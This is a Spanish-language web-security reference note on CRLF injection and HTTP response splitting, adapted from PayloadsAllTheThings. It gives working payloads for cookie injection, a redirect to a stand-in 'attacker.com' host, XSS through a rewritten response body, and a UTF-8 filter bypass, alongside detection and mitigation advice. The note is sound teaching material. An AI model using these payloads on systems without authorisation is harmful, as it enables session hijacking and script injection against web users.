---
tags:
  - seguridad-web
  - owasp
  - crlf
aliases:
  - CRLF
  - Inyección CRLF
  - HTTP Response Splitting
---

# Inyección CRLF

**La inyección CRLF** consiste en introducir caracteres de retorno de carro (`CR`, `\r`) y salto de línea (`LF`, `\n`) no esperados en una aplicación. Como en HTTP la secuencia `CRLF` separa cabeceras y delimita líneas, abusar de ella permite manipular la respuesta (HTTP Response Splitting), envenenar cachés, fijar cookies o lograr XSS.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?

- `CR` (`\r`, ASCII 13): vuelve al inicio de la línea.
- `LF` (`\n`, ASCII 10): pasa a la línea siguiente.

Si una entrada del usuario se refleja en una cabecera de respuesta sin sanear, inyectar `\r\n` permite cerrar la cabecera actual y añadir cabeceras o cuerpo arbitrarios. Codificados en URL suelen ser `%0d%0a`.

## Detección y pruebas

- Inyectar `%0d%0a` (o variantes) en parámetros que acaben reflejados en cabeceras (`Location`, `Set-Cookie`, etc.).
- Observar en la respuesta si aparece una nueva cabecera o cuerpo controlado por ti.

## Explotación / payloads

### Fijación de sesión (Set-Cookie)

Entrada `value\r\nSet-Cookie: admin=true` produce:

```http
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

### Open Redirect (inyectar Location)

```ps1
%0d%0aLocation:%20http://attacker.com
```

### XSS / reescritura del cuerpo

Desactiva la protección XSS e inyecta HTML como nuevo cuerpo:

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

### Bypass de filtros (caracteres UTF-8)

Algunos navegadores recortan caracteres fuera de rango dejando los bytes peligrosos. `嘊` (`%E5%98%8A`) se reduce a `%0A` y `嘍` (`%E5%98%8D`) a `%0D`:

```js
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

## Mitigación

- **Eliminar o rechazar** `CR` y `LF` (y sus codificaciones) en cualquier entrada que se refleje en cabeceras de respuesta.
- Usar **APIs de framework** que codifican/validan los valores de cabecera automáticamente, en lugar de construirlas a mano.
- **Validación con allowlist** de valores (especialmente URLs en redirecciones).
- Mantener actualizado el servidor/lenguaje, ya que muchos ya bloquean CRLF en cabeceras.

## Herramientas

- **Burp Suite** / **OWASP ZAP** — para inyectar y observar el splitting de respuesta.

---
🔗 Relacionado: [[Inyección SQL (SQLi)]] · [[HTTP Parameter Pollution (HPP)]] · [[SSI (Server-Side Includes)]]
📚 Fuente: [PayloadsAllTheThings — CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection) (MIT, © Swissky)
